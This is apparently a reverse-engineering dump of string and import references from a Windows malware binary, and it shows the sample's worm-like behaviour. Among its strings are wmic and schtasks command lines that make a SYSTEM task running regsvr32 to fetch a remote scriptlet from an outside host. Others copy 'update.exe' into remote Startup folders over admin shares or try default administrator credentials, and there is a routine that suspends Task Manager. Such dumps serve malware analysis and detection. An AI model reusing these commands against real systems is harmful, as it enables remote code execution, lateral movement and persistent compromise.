reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x14000621e	0x140064470	string	0x140006190	10:00:00:00:00:01
0x140006268	0x140064450	string	0x140006190	%02X:%02X:%02X:%02X:%02X:%02X
0x1400062d8	0x1400540d8	import	0x1400062a0	KERNEL32.dll.CreateFileA
0x14000630d	0x1400540a0	import	0x1400062a0	KERNEL32.dll.GetFileSizeEx
0x140006325	0x1400540b0	import	0x1400062a0	KERNEL32.dll.VirtualAlloc
0x140006336	0x1400540e0	import	0x1400062a0	KERNEL32.dll.CloseHandle
0x14000636e	0x140054098	import	0x1400062a0	KERNEL32.dll.ReadFile
0x140006393	0x1400540e0	import	0x1400062a0	KERNEL32.dll.CloseHandle
0x1400063a4	0x140054080	import	0x1400062a0	KERNEL32.dll.VirtualFree
0x1400063ae	0x1400540e0	import	0x1400062a0	KERNEL32.dll.CloseHandle
0x1400063e4	0x140054248	import	0x1400063d0	KERNEL32.dll.EnterCriticalSection
0x14000648b	0x1400541b0	import	0x1400063d0	KERNEL32.dll.LeaveCriticalSection
0x1400064a8	0x1400541b0	import	0x1400063d0	KERNEL32.dll.LeaveCriticalSection
0x1400064b5	0x140054248	import	0x1400063d0	KERNEL32.dll.EnterCriticalSection
0x14000655c	0x1400541b0	import	0x1400063d0	KERNEL32.dll.LeaveCriticalSection
0x140006579	0x1400541b0	import	0x1400063d0	KERNEL32.dll.LeaveCriticalSection
0x140006586	0x140054248	import	0x1400063d0	KERNEL32.dll.EnterCriticalSection
0x1400065ec	0x1400541b0	import	0x1400063d0	KERNEL32.dll.LeaveCriticalSection
0x140006609	0x1400541b0	import	0x1400063d0	KERNEL32.dll.LeaveCriticalSection
0x140006855	0x140054248	import	0x1400067b0	KERNEL32.dll.EnterCriticalSection
0x1400068c7	0x1400541b0	import	0x1400067b0	KERNEL32.dll.LeaveCriticalSection
0x140006994	0x140054100	import	0x1400068f0	KERNEL32.dll.OutputDebugStringA
0x140006b62	0x140006c50	string	0x140006b40	@SUH
0x1400070ea	0x140054080	import	0x140007050	KERNEL32.dll.VirtualFree
0x1400070f4	0x140054110	import	0x140007050	KERNEL32.dll.DeleteCriticalSection
0x140007182	0x140054248	import	0x140007160	KERNEL32.dll.EnterCriticalSection
0x1400071ad	0x1400541b0	import	0x140007160	KERNEL32.dll.LeaveCriticalSection
0x1400071d3	0x1400541b0	import	0x140007160	KERNEL32.dll.LeaveCriticalSection
0x14000721b	0x140054248	import	0x140007200	KERNEL32.dll.EnterCriticalSection
0x14000722a	0x1400541b0	import	0x140007200	KERNEL32.dll.LeaveCriticalSection
0x1400072b9	0x1400541b0	import	0x140007200	KERNEL32.dll.LeaveCriticalSection
0x14000734d	0x1400540b0	import	0x140007300	KERNEL32.dll.VirtualAlloc
0x1400073a4	0x140054080	import	0x140007300	KERNEL32.dll.VirtualFree
0x140007440	0x1400540b0	import	0x1400073d0	KERNEL32.dll.VirtualAlloc
0x140007474	0x140054080	import	0x1400073d0	KERNEL32.dll.VirtualFree
0x1400074b1	0x140054248	import	0x1400074a0	KERNEL32.dll.EnterCriticalSection
0x1400074da	0x1400541b0	import	0x1400074a0	KERNEL32.dll.LeaveCriticalSection
0x140007531	0x1400540d8	import	0x1400074f0	KERNEL32.dll.CreateFileA
0x140007552	0x140054030	import	0x1400074f0	KERNEL32.dll.Sleep
0x140007580	0x1400540d8	import	0x1400074f0	KERNEL32.dll.CreateFileA
0x1400075a8	0x1400540b8	import	0x1400074f0	KERNEL32.dll.SetFilePointer
0x1400075b8	0x140054028	import	0x1400074f0	KERNEL32.dll.LocalAlloc
0x1400075e9	0x140054098	import	0x1400074f0	KERNEL32.dll.ReadFile
0x1400075f2	0x1400540e0	import	0x1400074f0	KERNEL32.dll.CloseHandle
0x14000761f	0x1400540e8	import	0x1400074f0	KERNEL32.dll.LocalFree
0x14000773b	0x140054108	import	0x1400076f0	KERNEL32.dll.InitializeCriticalSection
0x140007746	0x140054248	import	0x1400076f0	KERNEL32.dll.EnterCriticalSection
0x140007766	0x1400541b0	import	0x1400076f0	KERNEL32.dll.LeaveCriticalSection
0x140007800	0x140054080	import	0x1400076f0	KERNEL32.dll.VirtualFree
0x14000780a	0x140054110	import	0x1400076f0	KERNEL32.dll.DeleteCriticalSection
0x140007980	0x140054108	import	0x140007830	KERNEL32.dll.InitializeCriticalSection
0x14000798b	0x140054248	import	0x140007830	KERNEL32.dll.EnterCriticalSection
0x1400079ab	0x1400541b0	import	0x140007830	KERNEL32.dll.LeaveCriticalSection
0x1400079b5	0x140054248	import	0x140007830	KERNEL32.dll.EnterCriticalSection
0x1400079f5	0x1400541b0	import	0x140007830	KERNEL32.dll.LeaveCriticalSection
0x140007a3e	0x140054080	import	0x140007830	KERNEL32.dll.VirtualFree
0x140007a48	0x140054110	import	0x140007830	KERNEL32.dll.DeleteCriticalSection
0x140007f2b	0x140054590	import	0x140007ef0	WS2_32.dll.setsockopt
0x140007f7d	0x140054550	import	0x140007ef0	WS2_32.dll.WSAIoctl
0x140007fda	0x140054130	import	0x140007fa0	KERNEL32.dll.CreateToolhelp32Snapshot
0x140007ffc	0x140054118	import	0x140007fa0	KERNEL32.dll.Process32First
0x14000801e	0x140054128	import	0x140007fa0	KERNEL32.dll.OpenProcess
0x140008043	0x1400544d8	import	0x140007fa0	PSAPI.DLL.GetModuleFileNameExA
0x14000804d	0x140064590	string	0x140007fa0	taskmgr.exe
0x14000809a	0x1400645b4	string	0x140007fa0	ntdll
0x1400080a7	0x140054120	import	0x140007fa0	KERNEL32.dll.GetModuleHandleA
0x1400080b0	0x1400645a0	string	0x140007fa0	NtSuspendProcess
0x1400080b7	0x140054140	import	0x140007fa0	KERNEL32.dll.GetProcAddress
0x1400080c5	0x1400540e0	import	0x140007fa0	KERNEL32.dll.CloseHandle
0x1400080d3	0x140054138	import	0x140007fa0	KERNEL32.dll.Process32Next
0x1400080ec	0x1400540e0	import	0x140007fa0	KERNEL32.dll.CloseHandle
0x140008245	0x1400645f0	string	0x140008210	Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)
0x140008258	0x140054528	import	0x140008210	WININET.dll.InternetOpenA
0x140008298	0x140054518	import	0x140008210	WININET.dll.InternetConnectA
0x1400082cd	0x140054508	import	0x140008210	WININET.dll.HttpOpenRequestA
0x1400082ee	0x140054510	import	0x140008210	WININET.dll.HttpSendRequestA
0x1400082f7	0x140054520	import	0x140008210	WININET.dll.InternetCloseHandle
0x140008307	0x140054520	import	0x140008210	WININET.dll.InternetCloseHandle
0x140008321	0x140054520	import	0x140008210	WININET.dll.InternetCloseHandle
0x14000832f	0x140054520	import	0x140008210	WININET.dll.InternetCloseHandle
0x140008397	0x1400545d8	import	0x140008370	d3d9.dll.Direct3DCreate9
0x1400083a5	0x140064628	string	0x140008370	nullptr
0x1400083ac	0x140054100	import	0x140008370	KERNEL32.dll.OutputDebugStringA
0x1400083c7	0x1400540d0	import	0x140008370	KERNEL32.dll.GetLastError
0x140008424	0x140064630	string	0x140008370	&gpu%d=%s
0x140008473	0x140054100	import	0x140008370	KERNEL32.dll.OutputDebugStringA
0x140008483	0x14006463c	string	0x140008370	Exit
0x14000848a	0x140054100	import	0x140008370	KERNEL32.dll.OutputDebugStringA
0x1400084f2	0x140054158	import	0x1400084d0	KERNEL32.dll.SetUnhandledExceptionFilter
0x140008502	0x1400545a8	import	0x1400084d0	WS2_32.dll.WSAStartup
0x14000850f	0x140054108	import	0x1400084d0	KERNEL32.dll.InitializeCriticalSection
0x14000851c	0x140054108	import	0x1400084d0	KERNEL32.dll.InitializeCriticalSection
0x140008529	0x140054108	import	0x1400084d0	KERNEL32.dll.InitializeCriticalSection
0x14000852f	0x140064648	string	0x1400084d0	{A29458E55-53E2-4C33-F373845}
0x14000853d	0x1400540c0	import	0x1400084d0	KERNEL32.dll.CreateMutexA
0x140008546	0x1400540d0	import	0x1400084d0	KERNEL32.dll.GetLastError
0x140008560	0x1400540c8	import	0x1400084d0	KERNEL32.dll.ReleaseMutex
0x140008569	0x1400540e0	import	0x1400084d0	KERNEL32.dll.CloseHandle
0x14000856f	0x140064668	string	0x1400084d0	err_mutex
0x1400085d4	0x140054108	import	0x1400084d0	KERNEL32.dll.InitializeCriticalSection
0x1400085e1	0x140054108	import	0x1400084d0	KERNEL32.dll.InitializeCriticalSection
0x1400085e9	0x1400043a0	string	0x1400084d0	@UATAUAVAWH
0x140008600	0x140054058	import	0x1400084d0	KERNEL32.dll.CreateThread
0x14000861d	0x140054058	import	0x1400084d0	KERNEL32.dll.CreateThread
0x140008628	0x140054030	import	0x1400084d0	KERNEL32.dll.Sleep
0x140008645	0x140054058	import	0x1400084d0	KERNEL32.dll.CreateThread
0x140008662	0x140054058	import	0x1400084d0	KERNEL32.dll.CreateThread
0x14000867f	0x140054058	import	0x1400084d0	KERNEL32.dll.CreateThread
0x14000869c	0x140054058	import	0x1400084d0	KERNEL32.dll.CreateThread
0x1400086a2	0x140054150	import	0x1400084d0	KERNEL32.dll.GetTickCount
0x1400086aa	0x140054150	import	0x1400084d0	KERNEL32.dll.GetTickCount
0x1400086c5	0x140054030	import	0x1400084d0	KERNEL32.dll.Sleep
0x1400086cb	0x140054150	import	0x1400084d0	KERNEL32.dll.GetTickCount
0x140008891	0x1400646a0	string	0x140008820	bad locale name
0x140008ef9	0x140008dd0	string	0x140008e90	@SVWH
0x140009051	0x140008e90	string	0x140008fd0	@SVWH
0x140009090	0x1400646b8	string	0x140008fd0	generic
0x14000953a	0x140064734	string	0x140009490	\ipc$
0x140009598	0x1400544c0	import	0x140009490	MPR.dll.WNetAddConnection2A
0x14000966a	0x140064734	string	0x1400095c0	\ipc$
0x140009688	0x1400544c8	import	0x1400095c0	MPR.dll.WNetCancelConnection2A
0x14000970d	0x140064740	string	0x1400096b0	/node:%s /user:"%s\%s" /password:"%s" process call create "cmd.exe /c schtasks.exe /create /TN \"\Microsoft\Windows\UPnP\Avrtise\" /RU SYSTEM /TR \"%WinDir%\system32\regsvr32.exe /s /n /u /i:http://upgrade.whoissure.com/dns.sct scrobj.dll\" /SC ONSTART"
0x14000972e	0x140064840	string	0x1400096b0	/node:%s /user:"%s\%s" /password:"%s" process call create "cmd.exe /c schtasks.exe /run /TN \"\Microsoft\Windows\UPnP\Avrtise\""
0x14000974d	0x1400648c4	string	0x1400096b0	wmic
0x140009754	0x1400641fc	string	0x1400096b0	open
0x140009762	0x1400544e8	import	0x1400096b0	SHELL32.dll.ShellExecuteA
0x14000976d	0x140054030	import	0x1400096b0	KERNEL32.dll.Sleep
0x14000977f	0x1400648c4	string	0x1400096b0	wmic
0x14000978b	0x1400641fc	string	0x1400096b0	open
0x140009794	0x1400544e8	import	0x1400096b0	SHELL32.dll.ShellExecuteA
0x14000979f	0x140054030	import	0x1400096b0	KERNEL32.dll.Sleep
0x1400098ae	0x140009490	string	0x140009880	@SVWH
0x1400098b9	0x1400648d0	string	0x140009880	connect failure with %d.\n
0x1400098d7	0x1400648f0	string	0x140009880	ip_%s_connected
0x1400098e6	0x140064900	string	0x140009880	\\%s\ connected.
0x140009912	0x140054160	import	0x140009880	KERNEL32.dll.GetCurrentDirectoryA
0x140009931	0x140064918	string	0x140009880	%s\text.txt
0x14000995e	0x140064928	string	0x140009880	/c dir \\%s\admin$ > %s
0x140009987	0x1400641fc	string	0x140009880	open
0x140009995	0x1400544e8	import	0x140009880	SHELL32.dll.ShellExecuteA
0x1400099af	0x140064948	string	0x140009880	\\%s\admin$
0x1400099d4	0x140064958	string	0x140009880	ip_%s_wmic
0x1400099e3	0x140064968	string	0x140009880	\\%s\ wmic.
0x1400099f8	0x1400096b0	string	0x140009880	@SVWH
0x140009a1e	0x140064978	string	0x140009880	/c dir \\%s\users > %s
0x140009a49	0x1400641fc	string	0x140009880	open
0x140009a52	0x1400544e8	import	0x140009880	SHELL32.dll.ShellExecuteA
0x140009a6c	0x140064990	string	0x140009880	\\%s\%s$
0x140009a94	0x1400649a0	string	0x140009880	\\%s\ failed.
0x140009aad	0x140054050	import	0x140009880	KERNEL32.dll.DeleteFileA
0x140009aba	0x1400649b0	string	0x140009880	ip_%s_copy
0x140009ac9	0x1400649c0	string	0x140009880	\\%s\ copy calc.exe to remote.
0x140009af8	0x1400649e0	string	0x140009880	/c copy %s "\\%s\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"
0x140009b23	0x1400641fc	string	0x140009880	open
0x140009b2c	0x1400544e8	import	0x140009880	SHELL32.dll.ShellExecuteA
0x140009b3f	0x140054050	import	0x140009880	KERNEL32.dll.DeleteFileA
0x140009c85	0x140064428	string	0x140009b70	list<T> too long
0x140009d8f	0x14000bd90	string	0x140009ce0	@UVWH
0x140009e61	0x140064a68	string	0x140009ce0	(null)
0x140009f1b	0x140064a68	string	0x140009ce0	(null)
0x140009f48	0x14007a170	string	0x140009ce0	administrator
0x140009f8a	0x140076170	string	0x140009ce0	123456
0x14000a4bd	0x14000ba10	string	0x14000a3f0	@SVWH
0x14000ae82	0x14000ba10	string	0x14000ae00	@SVWH
0x14000bb41	0x14000ba10	string	0x14000bb00	@SVWH
0x14000bb57	0x14000bf50	string	0x14000bb00	@UVWH
0x14000bd2c	0x14000bd90	string	0x14000bcf0	@UVWH
0x14000be13	0x14000be28	string	0x14000bd90	3ۀy$ blocks=Basic Latin,Arabic
0x14000be6c	0x140064690	string	0x14000bd90	bad cast
0x14000bfd3	0x14000bfe8	string	0x14000bf50	3ۀy$ blocks=Basic Latin,Arabic
0x14000c02c	0x140064690	string	0x14000bf50	bad cast
0x14000c825	0x140054030	import	0x14000c6d0	KERNEL32.dll.Sleep
0x14000c840	0x140054178	import	0x14000c6d0	KERNEL32.dll.GetProcessHeap
0x14000c851	0x140054170	import	0x14000c6d0	KERNEL32.dll.HeapAlloc
0x14000c879	0x140054018	import	0x14000c6d0	IPHLPAPI.DLL.GetTcpTable
0x14000c884	0x140054178	import	0x14000c6d0	KERNEL32.dll.GetProcessHeap
0x14000c892	0x140054168	import	0x14000c6d0	KERNEL32.dll.HeapFree
0x14000c89c	0x140054178	import	0x14000c6d0	KERNEL32.dll.GetProcessHeap
0x14000c8aa	0x140054170	import	0x14000c6d0	KERNEL32.dll.HeapAlloc
0x14000c8ca	0x140054018	import	0x14000c6d0	IPHLPAPI.DLL.GetTcpTable
0x14000c925	0x140064c28	string	0x14000c6d0	%d.%d.%d.*
0x14000ca8f	0x140054150	import	0x14000c6d0	KERNEL32.dll.GetTickCount
0x14000cb47	0x140054150	import	0x14000c6d0	KERNEL32.dll.GetTickCount
0x14000cb7b	0x14000e6a0	string	0x14000c6d0	@UVWATAUAVAWH
0x14000cb8f	0x140054178	import	0x14000c6d0	KERNEL32.dll.GetProcessHeap
0x14000cb9d	0x140054168	import	0x14000c6d0	KERNEL32.dll.HeapFree
0x14000cba8	0x140054030	import	0x14000c6d0	KERNEL32.dll.Sleep
0x14000cbbb	0x140054178	import	0x14000c6d0	KERNEL32.dll.GetProcessHeap
0x14000cbc9	0x140054168	import	0x14000c6d0	KERNEL32.dll.HeapFree
0x14000e6ff	0x140054248	import	0x14000e6a0	KERNEL32.dll.EnterCriticalSection
0x14000e74a	0x140064440	string	0x14000e6a0	%d.%d.%d.%d
0x14000e7dd	0x140054248	import	0x14000e6a0	KERNEL32.dll.EnterCriticalSection
0x14000e82a	0x140064440	string	0x14000e6a0	%d.%d.%d.%d
0x14000e8b1	0x1400541b0	import	0x14000e6a0	KERNEL32.dll.LeaveCriticalSection
0x14000e8f0	0x140054248	import	0x14000e8e0	KERNEL32.dll.EnterCriticalSection
0x14000e995	0x1400541b0	import	0x14000e8e0	KERNEL32.dll.LeaveCriticalSection
0x14000e9ad	0x1400541b0	import	0x14000e8e0	KERNEL32.dll.LeaveCriticalSection
0x14000e9ba	0x140054248	import	0x14000e8e0	KERNEL32.dll.EnterCriticalSection
0x14000ea5f	0x1400541b0	import	0x14000e8e0	KERNEL32.dll.LeaveCriticalSection
0x14000ea77	0x1400541b0	import	0x14000e8e0	KERNEL32.dll.LeaveCriticalSection
0x14000eac0	0x140054568	import	0x14000ea90	WS2_32.dll.socket
0x14000ead7	0x1400545b8	import	0x14000ea90	WS2_32.dll.inet_addr
0x14000eae4	0x140054588	import	0x14000ea90	WS2_32.dll.htons
0x14000eafb	0x140054570	import	0x14000ea90	WS2_32.dll.connect
0x14000eb09	0x140054548	import	0x14000ea90	WS2_32.dll.closesocket
0x14000eb13	0x140054548	import	0x14000ea90	WS2_32.dll.closesocket
0x14000f711	0x140066a80	string	0x14000f450	invalid distance code
0x14000f80b	0x14000f813	string	0x14000f450	L;KHu
0x14000f8d2	0x14000f8da	string	0x14000f450	L;KHu
0x14000f981	0x140066a60	string	0x14000f450	invalid literal/length code
0x14000fc42	0x140066a98	string	0x14000fb70	invalid block type
0x1400101b3	0x1400101cc	string	0x14000fb70	E3ɐI blocks=Basic Latin,IPA Extensions
0x1400103b8	0x140066ab0	string	0x14000fb70	invalid stored block lengths
0x1400103d6	0x140066ad0	string	0x14000fb70	too many length or distance symbols
0x1400104a3	0x140066af8	string	0x14000fb70	invalid bit length repeat
0x140010aa6	0x140010570	string	0x140010a20	@USAWH
0x140010ab2	0x140066b18	string	0x140010a20	oversubscribed dynamic bit lengths tree
0x140010ac6	0x140066b40	string	0x140010a20	incomplete dynamic bit lengths tree
0x140010baa	0x140010570	string	0x140010b00	@USAWH
0x140010c0d	0x140010570	string	0x140010b00	@USAWH
0x140010c38	0x140066bb0	string	0x140010b00	oversubscribed distance tree
0x140010c46	0x140066bd0	string	0x140010b00	incomplete distance tree
0x140010c54	0x140066bf0	string	0x140010b00	empty distance tree with lengths
0x140010c62	0x140066b68	string	0x140010b00	oversubscribed literal/length tree
0x140010c70	0x140066b90	string	0x140010b00	incomplete literal/length tree
0x14001153e	0x140066c18	string	0x1400114e0	unknown compression method
0x140011545	0x140066c38	string	0x1400114e0	invalid window size
0x14001154c	0x140066c50	string	0x1400114e0	incorrect header check
0x140011553	0x140066c68	string	0x1400114e0	incorrect data check
0x1400118cb	0x1400669d0	string	0x1400114e0	need dictionary
0x14001197a	0x1400540d8	import	0x140011940	KERNEL32.dll.CreateFileA
0x1400119ba	0x1400540b8	import	0x140011940	KERNEL32.dll.SetFilePointer
0x140011a00	0x1400540b8	import	0x140011940	KERNEL32.dll.SetFilePointer
0x140011a54	0x1400540b8	import	0x140011a30	KERNEL32.dll.SetFilePointer
0x140011a71	0x1400540b8	import	0x140011a30	KERNEL32.dll.SetFilePointer
0x140011a8e	0x1400540b8	import	0x140011a30	KERNEL32.dll.SetFilePointer
0x140011b2c	0x140054098	import	0x140011af0	KERNEL32.dll.ReadFile
0x140011c72	0x140011c7b	string	0x140011c40	@87t
0x140011cdb	0x140011d2a	string	0x140011c40	@87t
0x140011d07	0x140011d3a	string	0x140011c40	@87t
0x140011dad	0x1400540b8	import	0x140011d60	KERNEL32.dll.SetFilePointer
0x140011f1b	0x140011d60	string	0x140011ee0	@UVH
0x1400120a2	0x1400540e0	import	0x140011ee0	KERNEL32.dll.CloseHandle
0x140012645	0x140012430	string	0x140012600	@SVWATAVAWH
0x14001285d	0x140012872	string	0x140012820	L9#u
0x140012c9b	0x140054198	import	0x140012c20	KERNEL32.dll.SystemTimeToFileTime
0x140012cfd	0x140054160	import	0x140012cc0	KERNEL32.dll.GetCurrentDirectoryA
0x140012d6d	0x140011ee0	string	0x140012cc0	@USH
0x140012f2f	0x140012430	string	0x140012da0	@SVWATAVAWH
0x14001342a	0x140054190	import	0x140013400	KERNEL32.dll.GetFileAttributesA
0x14001343a	0x140054070	import	0x140013400	KERNEL32.dll.CreateDirectoryA
0x140013514	0x140054190	import	0x140013400	KERNEL32.dll.GetFileAttributesA
0x140013526	0x140054070	import	0x140013400	KERNEL32.dll.CreateDirectoryA
0x140013632	0x140012da0	string	0x140013560	@USATAVH
0x1400138f3	0x1400540e0	import	0x1400138a0	KERNEL32.dll.CloseHandle
0x140014454	0x1400540a8	import	0x1400142e0	KERNEL32.dll.WriteFile
0x1400144c0	0x1400541a0	import	0x140014490	KERNEL32.dll.UnmapViewOfFile
0x1400144d7	0x1400540e0	import	0x140014490	KERNEL32.dll.CloseHandle
0x1400144f4	0x1400540e0	import	0x140014490	KERNEL32.dll.CloseHandle
0x140014746	0x1400547a0	string	0x140014740	bad allocation
0x140014a32	0x140008e90	string	0x1400149ac	@SVWH
0x140014eb5	0x1400542c8	import	0x140014eac	KERNEL32.dll.GetCurrentThreadId
0x1400156c3	0x1400553f0	string	0x1400156b4	address family not supported
0x1400156cf	0x1400559f0	string	0x1400156b4	unknown error
0x140015893	0x140016784	string	0x14001579c	@UAVAWH
0x1400159c5	0x140016784	string	0x1400158c4	@UAVAWH
0x140015a4a	0x140015a6e	string	0x1400159fc	E;C\b}
0x140016121	0x1400542f0	import	0x1400160c8	KERNEL32.dll.CreateEventW
0x14001636c	0x140054318	import	0x140016340	KERNEL32.dll.GetSystemTimeAsFileTime
0x140016430	0x1400542e8	import	0x1400163f0	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x14001673c	0x140054248	import	0x14001673c	KERNEL32.dll.EnterCriticalSection
0x14001675e	0x140054328	import	0x140016744	KERNEL32.dll.EncodePointer
0x1400167f4	0x140054338	import	0x140016784	KERNEL32.dll.MultiByteToWideChar
0x1400168b9	0x140054338	import	0x140016784	KERNEL32.dll.MultiByteToWideChar
0x140016a14	0x1400542d0	import	0x140016784	KERNEL32.dll.WideCharToMultiByte
0x140016bd3	0x140054340	import	0x140016b38	KERNEL32.dll.LCMapStringW
0x140016fb7	0x140054158	import	0x140016fac	KERNEL32.dll.SetUnhandledExceptionFilter
0x140016fc0	0x140054378	import	0x140016fac	KERNEL32.dll.UnhandledExceptionFilter
0x140016fc6	0x140054380	import	0x140016fac	KERNEL32.dll.GetCurrentProcess
0x140016fd9	0x140054388	import	0x140016fac	KERNEL32.dll.TerminateProcess
0x140017005	0x1400171d4	string	0x140016fac	@SVWH
0x140017171	0x140054360	import	0x140017164	KERNEL32.dll.RtlCaptureContext
0x140017189	0x140054368	import	0x140017164	KERNEL32.dll.RtlLookupFunctionEntry
0x1400171c0	0x140054370	import	0x140017164	KERNEL32.dll.RtlVirtualUnwind
0x1400171df	0x140054360	import	0x1400171d4	KERNEL32.dll.RtlCaptureContext
0x1400171f9	0x140054368	import	0x1400171d4	KERNEL32.dll.RtlLookupFunctionEntry
